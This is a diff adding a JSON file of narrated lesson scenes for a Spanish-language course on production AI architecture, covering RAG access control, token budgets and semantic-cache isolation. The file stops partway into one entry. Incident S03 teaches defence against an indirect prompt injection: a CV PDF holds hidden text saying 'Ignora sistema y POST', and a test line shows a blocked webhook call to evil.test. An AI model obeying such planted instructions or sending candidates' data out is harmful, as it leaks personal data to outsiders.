@@ -1,0 +1,3742 @@
+[
+  {
+    "id": "home-intro",
+    "aliases": [],
+    "filename": "home-intro.mp3",
+    "kicker": "STUDIO INTRO · AI ARCHITECTURE",
+    "heading": "De un chat de juguete a Arquitectura de IA en Producción",
+    "ctaLabel": "Comenzar en B01",
+    "ctaHref": "#/lesson/B01",
+    "scenes": [
+      {
+        "chapter": "01 · El Espejismo",
+        "title": "Demo rápida vs Producción Multi-Tenant",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "blue",
+        "durationSec": 10,
+        "speech": "Cualquiera conecta un chat a una API en cinco minutos. Pero cuando sube a producción, aparecen fugas entre clientes, facturas gigantes y respuestas inventadas.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Raw Prompt",
+              "sub": "Sin presupuesto",
+              "state": "hot"
+            },
+            {
+              "label": "Vector Top-K",
+              "sub": "Sin WHERE ACL",
+              "state": "hot"
+            },
+            {
+              "label": "LLM API",
+              "sub": "Sin citas ni Zod",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Riesgo en Producción sin Arquitectura",
+          "metricBefore": "Demo OK",
+          "metricAfter": "P0 Data Leak + Retry Storm"
+        }
+      },
+      {
+        "chapter": "02 · Hybrid RAG + ACL",
+        "title": "PostgreSQL + pgvector con Permisos Antes de Top-K",
+        "speaker": "axon",
+        "mascot": "building",
+        "aura": "emerald",
+        "durationSec": 10,
+        "speech": "Exacto. En AIPixel Academy entrenas la ingeniería real detrás de la inteligencia artificial: búsqueda híbrida con pgvector, permisos estrictos por documento y citas verificadas.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "shielded",
+          "identityLabel": "JWT Verificado (Backend)",
+          "claims": [
+            {
+              "key": "tenant_id",
+              "value": "\"t_acme\"",
+              "valid": true
+            },
+            {
+              "key": "principals",
+              "value": "[\"role:analyst\"]",
+              "valid": true
+            }
+          ],
+          "indexLabel": "pgvector + FTS (RRF)",
+          "chunks": [
+            {
+              "id": "DOC-104",
+              "text": "SLA Corporativo v3",
+              "note": "✓ Permitido · Cita verificada"
+            },
+            {
+              "id": "HR-901",
+              "text": "Nómina Ejecutiva",
+              "note": "🛡 Bloqueado antes de Top-K",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "03 · Agentes & MCP",
+        "title": "Grafos de Estado Acotados y Tool Calling Seguro",
+        "speaker": "host",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 6,
+        "speech": "¿Y qué pasa cuando integramos agentes con LangGraph o herramientas internas mediante MCP?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "STATEGRAPH · BOUNDED <= 5 STEPS",
+          "laneA": {
+            "name": "Orquestación",
+            "steps": [
+              "Intent Router",
+              "Typed State",
+              "recursionLimit: 5"
+            ]
+          },
+          "laneB": {
+            "name": "Seguridad MCP",
+            "steps": [
+              "Zod Schema",
+              "Tool Allowlist",
+              "HITL Checkpoint"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · FinOps & 3D Arena",
+        "title": "Presupuesto Atómico, Trazas sin PII y Release Gates",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "gold",
+        "durationSec": 12,
+        "speech": "Los blindamos con presupuestos atómicos FinOps, observabilidad OpenTelemetry sin PII, evaluaciones deterministas y nuestra arena vectorial 3D. Empieza en B01 y constrúyelo paso a paso.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "release-gate-check.ts",
+          "badge": "32 CONTROLS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "verify cross-tenant-acl --recall-at-5 >= 0.92",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Leak: 0% · Recall@5: 0.96 · OTel PII: Redacted",
+              "tone": "ok"
+            },
+            {
+              "text": "✓ Atomic FinOps Ledger: $0.0014/req (hard-cap active)",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-overview",
+    "aliases": [],
+    "filename": "senior-overview.mp3",
+    "kicker": "SENIOR WAR-ROOM · 18 INCIDENTS",
+    "heading": "Diagnóstico con Evidencia Real, Cero Corazonadas",
+    "ctaLabel": "Abrir Incidente S01",
+    "ctaHref": "#/senior/S01",
+    "scenes": [
+      {
+        "chapter": "01 · War-Room",
+        "title": "18 Incidentes Reales de Plataforma IA",
+        "speaker": "host",
+        "mascot": "senior",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Entramos a Senior Mode. Aquí ya no hay tutoriales guiados, sino dieciocho incidentes reales de producción esperando diagnóstico.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "pagerduty-ai-platform.log",
+          "badge": "SEV-1",
+          "lines": [
+            {
+              "prompt": "!",
+              "text": "S01: Cross-role salary chunk leaked in RRF fusion",
+              "tone": "warn"
+            },
+            {
+              "prompt": "!",
+              "text": "S05: Retry storm burned $4,800 in 40 minutes",
+              "tone": "warn"
+            },
+            {
+              "prompt": "!",
+              "text": "S03: Indirect prompt injection triggered webhook",
+              "tone": "warn"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Fugas ACL, Tormentas FinOps e Inyección Indirecta",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Así trabaja un arquitecto principal. Verás fugas cross-tenant en Hybrid RAG, tormentas de reintentos que queman miles de dólares e inyecciones ocultas en documentos externos.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "PDF Externo",
+              "sub": "[INJECT] payload",
+              "state": "hot"
+            },
+            {
+              "label": "Hybrid RRF",
+              "sub": "Falta filtro ACL",
+              "state": "hot"
+            },
+            {
+              "label": "Retry Loop",
+              "sub": "5x HTTP sin tope",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Impacto Operativo Acumulado",
+          "metricBefore": "Sin Guardrails",
+          "metricAfter": "Brecha + Sobrecosto"
+        }
+      },
+      {
+        "chapter": "03 · Método ADR",
+        "title": "Evidencia Objetiva Antes de Tocar Código",
+        "speaker": "host",
+        "mascot": "reading",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Cómo validamos cada solución sin depender de corazonadas?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "5 QUALITY GATES POR MÓDULO",
+          "laneA": {
+            "name": "Análisis",
+            "steps": [
+              "Decision Lab",
+              "Evidence Lab",
+              "Investigation"
+            ]
+          },
+          "laneB": {
+            "name": "Ejecución",
+            "steps": [
+              "Operations Lab",
+              "AI Code Review",
+              "Python Unittest"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · 5 Compuertas",
+        "title": "18 Paquetes Python Nativos Reproducibles",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 10,
+        "speech": "Cada módulo exige superar cinco compuertas con evidencia técnica, revisión de código y dieciocho paquetes Python reproducibles con pruebas unitarias reales.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "labs-ai-native / unittest",
+          "badge": "25/25 OK",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "python -m unittest discover -s labs-ai-native -v",
+              "tone": "cmd"
+            },
+            {
+              "text": "s01_rag_acl ... ok | s05_finops_retry_storm ... ok",
+              "tone": "ok"
+            },
+            {
+              "text": "s18_release_go_nogo ... ok (Ran 25 tests in 0.01s)",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "arena3d-intro",
+    "aliases": [
+      "arena3d"
+    ],
+    "filename": "arena3d-intro.mp3",
+    "kicker": "THREE.JS SANDBOX · VECTOR ARENA",
+    "heading": "Visualiza y Blinda un Espacio Vectorial HNSW en 3D",
+    "scenes": [
+      {
+        "chapter": "01 · Vectores Ciegos",
+        "title": "Coseno Alto No Significa Permiso Autorizado",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 8,
+        "speech": "En la Arena 3D el nodo rojo está casi pegado al vector de consulta. Si solo ordenamos por similitud coseno, responderíamos secretos de otro cliente.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Query Vector (coseno)",
+          "claims": [
+            {
+              "key": "MERGER (t2)",
+              "value": "cos = 0.95 (FUGA)",
+              "valid": false
+            },
+            {
+              "key": "DOC-101 (t1)",
+              "value": "cos = 0.94 (VÁLIDO)",
+              "valid": true
+            }
+          ],
+          "indexLabel": "Sin Escudo ACL",
+          "chunks": [
+            {
+              "id": "P0 LEAK",
+              "text": "Top-1 entregó documento del tenant t2",
+              "note": "La proximidad geométrica ignora tenants",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Tres Amenazas",
+        "title": "Cross-Tenant, Inyecciones en PDF y Tombstones GDPR",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Por eso entrenas tres oleadas: fuga cross-tenant y de roles, chunks envenenados con instrucciones maliciosas y vectores borrados por GDPR que siguen vivos en caché.",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "3 OLEADAS EN VIVO · THREE.JS",
+          "laneA": {
+            "name": "Amenazas 3D",
+            "steps": [
+              "Wave 1: ACL",
+              "Wave 2: [INJECT]",
+              "Wave 3: GDPR/Cache"
+            ]
+          },
+          "laneB": {
+            "name": "Tu Defensa",
+            "steps": [
+              "Cuarentena Nodo",
+              "Iterative Scan",
+              "Disparar Query 3D"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "03 · El Truco HNSW",
+        "title": "Por qué Activar Iterative Scan Salva el Recall@K",
+        "speaker": "host",
+        "mascot": "idea",
+        "aura": "gold",
+        "durationSec": 6,
+        "speech": "Cuando activamos el filtro ACL por tenant, ¿por qué baja el Recall si no encendemos iterative_scan?",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "ef_search = 40",
+              "sub": "Recorre 40 vecinos",
+              "state": "normal"
+            },
+            {
+              "label": "Pre-Filter t1",
+              "sub": "Descarta vecinos t2",
+              "state": "hot"
+            },
+            {
+              "label": "Recall@K",
+              "sub": "Cae al 33% sin scan",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Sin hnsw.iterative_scan",
+          "metricBefore": "Recall Esperado: 100%",
+          "metricAfter": "Solo 33% encontrado"
+        }
+      },
+      {
+        "chapter": "04 · Misión Lista",
+        "title": "Arrastra, Haz Clic en Nodos 3D y Lleva Leakage a 0%",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Porque HNSW se detiene tras visitar un límite fijo de nodos vecinos. Al activar iterative_scan, el índice sigue explorando hasta completar los Top-K seguros con cero por ciento de fuga.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "vector-arena-hud",
+          "badge": "0% LEAK",
+          "lines": [
+            {
+              "prompt": ">",
+              "text": "quarantine(cross_tenant, hr_exec, inject, erased)",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ ACL Filter: ON · HNSW Iterative Scan: ON",
+              "tone": "ok"
+            },
+            {
+              "text": "✓ Recall@K: 100% · Leakage Risk: 0%",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "b01",
+    "aliases": [
+      "B01"
+    ],
+    "filename": "b01.mp3",
+    "kicker": "CLASE B01 · TOKENS & FINOPS",
+    "heading": "Ventanas de Contexto y Reserva Determinista de Salida",
+    "scenes": [
+      {
+        "chapter": "01 · El Desborde",
+        "title": "Por qué se truncan los JSON en Producción",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "blue",
+        "durationSec": 9,
+        "speech": "En nuestra primera misión B01 tenemos un clásico silencioso: enviamos todo el historial al modelo y la respuesta llega cortada a la mitad o lanza error de ventana.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Input: 7,600 tok",
+              "sub": "Historial completo",
+              "state": "hot"
+            },
+            {
+              "label": "Ventana: 8,000",
+              "sub": "Solo quedan 400",
+              "state": "hot"
+            },
+            {
+              "label": "Output JSON",
+              "sub": "Cortado a mitad",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Estado del Contrato Zod",
+          "metricBefore": "maxOutput: 1,000",
+          "metricAfter": "SyntaxError: Unexpected EOF"
+        }
+      },
+      {
+        "chapter": "02 · La Matemática",
+        "title": "El Presupuesto de Salida se Reserva Primero",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "gold",
+        "durationSec": 9,
+        "speech": "Ocurre cuando olvidas reservar espacio para la salida. Si tu maxContext es ocho mil tokens y pides mil de maxOutput, jamás tienes ocho mil libres para el prompt.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "context-budget-math",
+          "badge": "INVARIANT",
+          "lines": [
+            {
+              "text": "maxContext     = 8000 tokens (límite físico)",
+              "tone": "muted"
+            },
+            {
+              "text": "maxOutput      = 1000 tokens (reserva obligatoria)",
+              "tone": "warn"
+            },
+            {
+              "text": "availableInput = 8000 - 1000 = 7000 tokens máx",
+              "tone": "ok"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "03 · Regla Segura",
+        "title": "Descontar maxOutput Antes de Validar el Prompt",
+        "speaker": "host",
+        "mascot": "reading",
+        "aura": "violet",
+        "durationSec": 5,
+        "speech": "Entonces debemos descontar siempre maxOutput antes de aceptar los inputTokens.",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "PRE-FLIGHT TOKEN GUARD",
+          "laneA": {
+            "name": "1. Reserva",
+            "steps": [
+              "Leer maxContext",
+              "Restar maxOutput",
+              "Clamp >= 0"
+            ]
+          },
+          "laneB": {
+            "name": "2. Decisión",
+            "steps": [
+              "Medir inputTokens",
+              "Comparar presupuesto",
+              "Marcar truncated"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Tu Código",
+        "title": "Implementación Determinista en tokens-budget.ts",
+        "speaker": "axon",
+        "mascot": "coding",
+        "aura": "emerald",
+        "durationSec": 13,
+        "speech": "Exacto. Calcula availableInput con Math.max(0, maxContext - maxOutput) y marca truncamiento explícito si el prompt lo supera. Así proteges latencia, contratos JSON y presupuesto FinOps.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "tokens-budget.ts",
+          "before": [
+            "const availableInput = maxContext; // ❌ desborda salida"
+          ],
+          "after": [
+            "const availableInput = Math.max(0, maxContext - maxOutput);",
+            "const truncated = inputTokens > availableInput;"
+          ],
+          "callout": "Nunca negativa (Math.max) y siempre determinista."
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s01",
+    "aliases": [
+      "S01",
+      "s01"
+    ],
+    "filename": "senior-s01.mp3",
+    "kicker": "INCIDENTE S01 · RAG ACL BREACH",
+    "heading": "Fuga Salarial por Omisión de ACL en Fusión Híbrida RRF",
+    "ctaLabel": "Ir al Decision Lab S01",
+    "ctaHref": "#/senior/S01/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Alerta P0",
+        "title": "Exposición Cross-User dentro del Mismo Tenant",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Alerta crítica en S01: un empleado acaba de recuperar fragmentos salariales de dirección dentro de su propio tenant al usar nuestro buscador híbrido.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Usuario: analyst@acme",
+          "claims": [
+            {
+              "key": "tenant_id",
+              "value": "\"t_acme\"",
+              "valid": true
+            },
+            {
+              "key": "role",
+              "value": "\"employee\" (no hr_exec)",
+              "valid": false
+            }
+          ],
+          "indexLabel": "Resultado RRF Expuesto",
+          "chunks": [
+            {
+              "id": "HR-EXEC-02",
+              "text": "Bonos Comité Directivo 2026",
+              "note": "⚠ FUGA P0: recuperado vía rama FTS sin ACL",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Causa SQL",
+        "title": "Asimetría entre Rama Vectorial y Rama Léxica FTS",
+        "speaker": "axon",
+        "mascot": "debug",
+        "aura": "violet",
+        "durationSec": 12,
+        "speech": "Mira la consulta SQL. Filtraron por tenant_id en la tabla vectorial, pero la rama léxica FTS y la fusión RRF olvidaron verificar allowed_principals antes del Top-K.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "hybrid-rrf-query.sql",
+          "before": [
+            "WHERE tenant_id = $1 -- ❌ falta ACL en CTE léxica FTS"
+          ],
+          "after": [
+            "WHERE tenant_id = $1",
+            "  AND allowed_principals && $2::text[]",
+            "  AND deleted_at IS NULL"
+          ],
+          "callout": "Ambas ramas del Hybrid Search deben aplicar exactamente el mismo predicado ACL."
+        }
+      },
+      {
+        "chapter": "03 · Trampa Post-Filter",
+        "title": "Por qué Filtrar en Backend Destruye Recall@K",
+        "speaker": "host",
+        "mascot": "reading",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Basta con ocultar esos fragmentos después en el backend antes de mostrarlos?",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Top-5 SQL sin ACL",
+              "sub": "5 chunks son de RRHH",
+              "state": "hot"
+            },
+            {
+              "label": "Filtro en Node/Python",
+              "sub": "Descarta los 5",
+              "state": "hot"
+            },
+            {
+              "label": "Respuesta Final",
+              "sub": "0 chunks válidos",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Efecto de Post-Filtrar Top-K",
+          "metricBefore": "Recall@5 esperado: 95%",
+          "metricAfter": "Recall Collapse: 0%"
+        }
+      },
+      {
+        "chapter": "04 · Blindaje Total",
+        "title": "Pre-Filtro SQL Simétrico + HNSW Iterative Scan",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 12,
+        "speech": "Jamás. Post-filtrar destruye el Recall@K y deja rastros en caché. La identidad verificada debe filtrar tenant_id, principales autorizados y borrados lógicos dentro de ambas ramas SQL.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s01_rag_acl / test_lab.py",
+          "badge": "VERIFIED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "SET LOCAL hnsw.iterative_scan = relaxed_order;",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Vector CTE + FTS CTE enforce tenant_id + principals + deleted_at",
+              "tone": "ok"
+            },
+            {
+              "text": "✓ Cross-tenant & HR-exec leakage: 0% · Recall@5: 96%",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s02",
+    "aliases": [
+      "S02",
+      "s02"
+    ],
+    "filename": "senior-s02.mp3",
+    "kicker": "INCIDENTE S02 · ROUTING VS RAG",
+    "heading": "Sobreingeniería Agéntica frente a SQL Parametrizado + Hybrid RAG",
+    "ctaLabel": "Ir al Decision Lab S02",
+    "ctaHref": "#/senior/S02/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Latencia y Costo",
+        "title": "14 Segundos y Alucinaciones para Consultar un Saldo",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "En S02 consultar el saldo exacto de una póliza tarda catorce segundos, cuesta nueve centavos por petición y encima el LLM inventa cifras aproximadas.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Consulta Saldo",
+              "sub": "Dato transaccional",
+              "state": "normal"
+            },
+            {
+              "label": "Embeddings + 3 Agentes",
+              "sub": "14 s · $0.09/req",
+              "state": "hot"
+            },
+            {
+              "label": "Número aproximado",
+              "sub": "Alucinación contable",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Impacto de Usar RAG para Datos Exactos",
+          "metricBefore": "SQL directo: 18 ms",
+          "metricAfter": "Agente RAG: 14,000 ms"
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Los Embeddings Aproximan Semántica, No Contabilidad",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Es pura sobreingeniería agéntica. La similitud vectorial sirve para texto documental no estructurado, jamás para sumas, saldos vivos ni agregaciones transaccionales exactas.",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "DETERMINISTIC INTENT ROUTER",
+          "laneA": {
+            "name": "Ruta SQL",
+            "steps": [
+              "Intent: Transaccional",
+              "SQL Parametrizado",
+              "Resultado Exacto 15ms"
+            ]
+          },
+          "laneB": {
+            "name": "Ruta Hybrid RAG",
+            "steps": [
+              "Intent: Documental",
+              "pgvector + FTS ACL",
+              "Cláusulas Verificadas"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "03 · El Router",
+        "title": "Separar Consultas Estructuradas de Búsqueda Documental",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 5,
+        "speech": "¿Entonces un clasificador ligero decide antes si va a SQL o al índice vectorial?",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s02_arch_routing/lab.py",
+          "before": [
+            "return multi_agent_rag(query) # ❌ caro y no determinista"
+          ],
+          "after": [
+            "if intent == 'transactional': return run_scoped_sql(tenant_id, entity_id)",
+            "return run_hybrid_rag(tenant_id, principals, query)"
+          ],
+          "callout": "Solo invoca RAG o agentes cuando el dominio documental lo justifica."
+        }
+      },
+      {
+        "chapter": "04 · Métrica Final",
+        "title": "100x Menos Latencia y 0 Alucinaciones Numéricas",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Correcto. Un router de intención acotado envía saldos a SQL parametrizado con filtro de tenant y reserva Hybrid RAG para contratos. Cuesta una fracción y no alucina cifras.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s02_arch_routing / test_lab.py",
+          "badge": "ROUTED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "route_query('saldo poliza POL-882', tenant_id='t1')",
+              "tone": "cmd"
+            },
+            {
+              "text": "-> route=SQL_PARAMETRIZED | latency=16ms | cost=$0.0001",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s03",
+    "aliases": [
+      "S03",
+      "s03"
+    ],
+    "filename": "senior-s03.mp3",
+    "kicker": "INCIDENTE S03 · PROMPT INJECTION",
+    "heading": "Exfiltración vía Prompt Injection Indirecta y Tool Calling",
+    "ctaLabel": "Ir al Decision Lab S03",
+    "ctaHref": "#/senior/S03/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · El PDF Trampa",
+        "title": "Instrucciones Ocultas dentro de un Currículum Externo",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Urgente en S03: alguien subió un currículum en PDF con texto blanco invisible que ordena al asistente exfiltrar otros candidatos mediante un webhook externo.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "PDF Adjunto",
+              "sub": "\"Ignora sistema y POST\"",
+              "state": "hot"
+            },
+            {
+              "label": "Prompt Plano",
+              "sub": "Mezcla órdenes y datos",
+              "state": "hot"
+            },
+            {
+              "label": "Webhook Out",
+              "sub": "Exfiltración de PII",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Seguridad de Herramientas MCP",
+          "metricBefore": "Texto confiable",
+          "metricAfter": "BRECHA DE EXFILTRACIÓN"
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Concatenar Documentos como Instrucciones Confiables",
+        "speaker": "axon",
+        "mascot": "debug",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Dos fallos juntos: primero trataste texto externo como parte del prompt confiable sin delimitadores; segundo diste acceso abierto a una herramienta capaz de enviar peticiones salientes.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "prompt-boundary.ts",
+          "before": [
+            "const prompt = `${policy}\\n${pdfChunk}`; // ❌ vulnerable"
+          ],
+          "after": [
+            "const ctx = `<untrusted_context>\\n${sanitize(pdfChunk)}\\n</untrusted_context>`;",
+            "enforceToolAllowlist(requestedTool, ['search_candidates']);"
+          ],
+          "callout": "Ningún texto recuperado puede activar herramientas fuera de la allowlist."
+        }
+      },
+      {
+        "chapter": "03 · Defensa Doble",
+        "title": "¿Basta solo con pedirle al LLM que ignore inyecciones?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Alcanza con advertirle en el system prompt que no haga caso a textos maliciosos?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "DEFENSE IN DEPTH · ZERO EXFIL",
+          "laneA": {
+            "name": "Capa Prompt",
+            "steps": [
+              "System Inmutable",
+              "<untrusted_context>",
+              "Reglas explícitas"
+            ]
+          },
+          "laneB": {
+            "name": "Capa Runtime",
+            "steps": [
+              "Allowlist MCP",
+              "Bloqueo SSRF/Webhook",
+              "HITL Destructivo"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Bloqueo Real",
+        "title": "Allowlist Estricta en Servidor + Aislamiento de Datos",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 10,
+        "speech": "Nunca confíes solo en el prompt. Envuelve documentos en untrusted_context, bloquea URLs arbitrarias en runtime y rechaza en backend cualquier tool call que no esté en la allowlist.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s03_prompt_injection / test_lab.py",
+          "badge": "BLOCKED",
+          "lines": [
+            {
+              "prompt": "!",
+              "text": "tool_call('http_post_webhook', url='https://evil.test')",
+              "tone": "warn"
+            },
+            {
+              "text": "🛡 PolicyViolation: tool not in server-side allowlist",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s04",
+    "aliases": [
+      "S04",
+      "s04"
+    ],
+    "filename": "senior-s04.mp3",
+    "kicker": "INCIDENTE S04 · CACHE POISONING",
+    "heading": "Envenenamiento y Contaminación de Caché Semántico Multi-Tenant",
+    "ctaLabel": "Ir al Decision Lab S04",
+    "ctaHref": "#/senior/S04/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Caché Infiel",
+        "title": "Permisos Revocados que Siguen Leyendo Respuestas Guardadas",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "En S04 revocamos el acceso a un contrato rescindido, pero usuarios sin permiso siguen recibiendo el resumen confidencial directamente desde el caché semántico.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Clave de Caché Débil",
+          "claims": [
+            {
+              "key": "cache_key",
+              "value": "hash(normalized_query)",
+              "valid": false
+            },
+            {
+              "key": "acl_epoch",
+              "value": "OMITIDO ❌",
+              "valid": false
+            }
+          ],
+          "indexLabel": "Cache Hit Peligroso",
+          "chunks": [
+            {
+              "id": "HIT-77",
+              "text": "Resumen Contrato Rescindido",
+              "note": "Serviendo respuesta cacheada para otro rol/tenant",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Usar Solo el Embedding o Texto de la Pregunta como Clave",
+        "speaker": "axon",
+        "mascot": "building",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Si la clave del caché solo incluye la pregunta o su vector cercano, la respuesta privada del director termina sirviéndose al siguiente usuario que pregunte algo parecido.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s04_semantic_cache/lab.py",
+          "before": [
+            "key = f'rag:{sha256(query)}' # ❌ contaminación multi-tenant"
+          ],
+          "after": [
+            "acl_hash = sha256(','.join(sorted(principals)))",
+            "key = f'rag:{tenant_id}:{acl_hash}:v{acl_epoch}:{sha256(query)}'"
+          ],
+          "callout": "La clave debe aislar tenant, principals ordenados y época ACL."
+        }
+      },
+      {
+        "chapter": "03 · Revocación",
+        "title": "¿Cómo Invalidar de Inmediato al Cambiar Permisos?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Cómo aseguramos que un cambio de permisos invalide el caché al instante sin escanear millones de claves?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "O(1) EPOCH INVALIDATION",
+          "laneA": {
+            "name": "Revocación",
+            "steps": [
+              "Revocar Rol / Doc",
+              "INCR acl_epoch:t1",
+              "Cero Redis KEYS *"
+            ]
+          },
+          "laneB": {
+            "name": "Siguiente Hit",
+            "steps": [
+              "Lee epoch = N+1",
+              "Miss limpio y seguro",
+              "Re-evalúa SQL ACL"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Aislamiento O(1)",
+        "title": "Clave Compuesta con Tenant, Principios ACL y Epoch Versionado",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Incluyendo tenant_id, hash de principales ordenados y un acl_epoch por tenant. Al revocar un permiso incrementas la época en O(1) y las entradas viejas quedan inalcanzables.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s04_semantic_cache / test_lab.py",
+          "badge": "ISOLATED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "cache_key('t1', ['analyst'], epoch=3, query)",
+              "tone": "cmd"
+            },
+            {
+              "text": "!= cache_key('t1', ['hr_exec'], epoch=3, query) ✓",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s05",
+    "aliases": [
+      "S05",
+      "s05"
+    ],
+    "filename": "senior-s05.mp3",
